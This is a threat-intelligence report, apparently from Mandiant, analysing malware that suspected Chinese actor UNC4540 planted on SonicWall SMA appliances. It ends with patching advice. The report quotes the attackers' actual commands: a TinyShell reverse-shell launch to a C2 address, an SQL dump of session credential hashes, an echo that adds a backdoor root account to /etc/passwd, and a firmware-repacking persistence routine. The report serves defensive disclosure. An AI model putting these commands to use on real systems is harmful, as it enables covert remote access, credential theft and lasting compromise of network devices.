Mandiant, working in partnership with SonicWall Product Security and Incident Response
Team (PSIRT), has identified a suspected Chinese campaign that involves maintaining long
term persistence by running malware on an unpatched SonicWall Secure Mobile Access
(SMA) appliance. The malware has functionality to steal user credentials, provide shell
access, and persist through firmware upgrades. Mandiant currently tracks this actor as
UNC4540.

Malware

1/5

Analysis of a compromised device revealed a collection of files that give the attacker a highly
privileged and available access to the appliance. The malware consists of a series of bash
scripts and a single ELF binary identified as a TinyShell variant. The overall behavior of the
suite of malicious bash scripts shows a detailed understanding of the appliance and is well
tailored to the system to provide stability and persistence. Table 1 contains a list of the
malicious files.

Main Module
The main malware entry point is a bash script named firewalld, which executes its primary
loop once for a count of every file on the system squared: …for j in $(ls / -R) do for
i in $(ls / -R) do:… The script is responsible for executing an SQL command to
accomplish credential stealing and execution of the other components.
The first function in firewalld executes the TinyShell backdoor httpsd with command
nohup /bin/httpsd -c<C2 IP ADDRESS> -d 5 -m -1 -p 51432 > /dev/null 2>&1 & if

the httpsd process isn’t already running. This sets TinyShell to reverse-shell mode,
instructing it to call out to the aforementioned IP address and port at a specific time and day
represented by the -m flag, with a beacon interval defined by the -d flag. The binary embeds
a hard coded IP address, which is used in reverse-shell mode if the IP address argument is
left blank. It also has a listening bind shell mode available.

Primary Purpose is Likely Credential Theft
2/5

The primary purpose of the malware appears to be to steal hashed credentials from all
logged in users. It does this in firewalld by routinely executing the SQL command select
userName,password from Sessions against sqlite3 database /tmp/temp.db and copying
them out to the attacker created text file /tmp/syslog.db. The source database
/tmp/temp.db is used by the appliance to track session information, including hashed
credentials. Once retrieved by the attacker the hashes could be cracked offline.

Implementation Shows Emphasis on Persistence and Stability
The attackers put significant effort into the stability and persistence of their tooling. This
allows their access to the network to persist through firmware updates and maintain a
foothold on the network through the SonicWall Device.

Redundant Scripts
The startup script rc.local runs firewalld at boot time, but efforts to ensure stability and
persistence extend beyond that, with functionality designed to enable long-term attacker
access.
A second copy of firewalld named iptabled was also present on the device. iptabled
was modified to provide persistence for the main malware process in case of exit or crash.
The two scripts were configured to call the other if it was not running, providing a backup
instance of the main malware process and therefore an additional layer of resilience.

Firmware Updates Modified to Allow Persistence, Create new Root
In addition to ensuring stability, the attackers implemented a process for ensuring their
access would persist across firmware updates. The bash script geoBotnetd checks every ten
seconds for a new firmware upgrade to appear at /cf/FIRMWARE/NEW/INITRD.GZ. If it does,
the script will copy the file for backup, unzip it, mount it, and then copy over the whole
package of malware files. geoBotnetd also executes echo -e
"acme:wegB/YNBuL7QI:0:0:pwned:/acme:/bin/bash\n" >> /sda/etc/passwd, which adds
backdoor root user acme to the system. Then it rezips everything and puts it back in place
with all the malware included, ready for installation. The technique is not especially
sophisticated, but it does show considerable effort on the part of the attacker to understand
the appliance update cycle, then develop and test a method for persistence.
The techniques used here, including backdooring update zips and modifying appliance
binaries, is consistent with those described in Re-Checking Your Pulse: Updates on Chinese
APT Actors Compromising Pulse Secure VPN Devices, although Mandiant tracks these
threats separately.
These firmware manipulations only occurred post-exploitation on an already infected device,
and were not seen used in a supply chain attack.
3/5

Patch Applied to Binary, Potentially to Increase Stability
In a similar vein that shows the effort put into tailoring the malware, the main firewalld
script includes a function to add a small patch to the legitimate SonicWall binary firebased.
It uses a simple sed command to replace the string /sbin/shutdown -r now with bash
/bin/ifconfig6 in the binary and then creates script /bin/ifconfig6 with contents.
#!/bin/sh
ifconfig eth0 down
sleep 90
/sbin/shutdown -r now

Mandiant did not delve into detail on how this would affect the appliance or under what
conditions it would have an impact, but it is clear from the change that this was intended to
provide a graceful close-down of the network controller before executing the shutdown
command. It is likely that the attackers have encountered issues either in use or testing when
firebased shuts down the appliance.

Long Term Operation, Initial Infection Vector Unknown
Mandiant was not able to determine the origin of the infection, however, the malware, or a
predecessor of it, was likely deployed in 2021. Mandiant believes that attacker access has
persisted through multiple firmware updates.

Detect and Defend
First and foremost, maintaining proper patch management is essential for mitigating the risk
of vulnerability exploitation. At the time of publishing this blog post, SonicWall urges SMA100
customers to upgrade to 10.2.1.7 or higher, which includes hardening enhancements such
as File Integrity Monitoring (FIM) and anomalous process identification. A SonicWall blog
post describing the patch features is available (New SMA Release Updates OpenSSL
Library, Includes Key Security Features) and the patch itself can be found here: Upgrade
Path For SMA100 Series.
To help keep customers secure, SMA100 customers on versions 10.2.1.7 or higher will
receive notifications in their Management Console about pending CRITICAL security
updates.
Given the difficulty in directly examining impacted devices, reviewing available logs for
secondary signs of compromise, such as abnormal logins or internal traffic, may offer some
opportunities for detection. However, applying the recent patch is the best way to limit any

unexpected tampering or modification of the appliance.

A Pattern of Chinese Network Device Compromises
Developing malware for a managed appliance is often no trivial task. Vendors typically do not
enable direct access to the Operating System or filesystem for users, instead offering
administrators a graphical UI or limited Command Line Interface (CLI) with guardrails
preventing anyone from accidentally breaking the system. Because of this lack of access,
attackers require a fair amount of resource and effort to develop exploits and malware for
managed devices.
In recent years Chinese attackers have deployed multiple zero-day exploits and malware for
a variety of internet facing network appliances as a route to full enterprise intrusion, and the
instance reported here is part of a recent pattern that Mandiant expects to continue in the
near term. For further information, see Mandiant blog post: Suspected Chinese Threat Actors
Exploiting FortiOS Vulnerability (CVE-2022-42475). In particular the section "China
Continues to Focus on Network Devices" summarizes some of Mandiant’s recent findings.
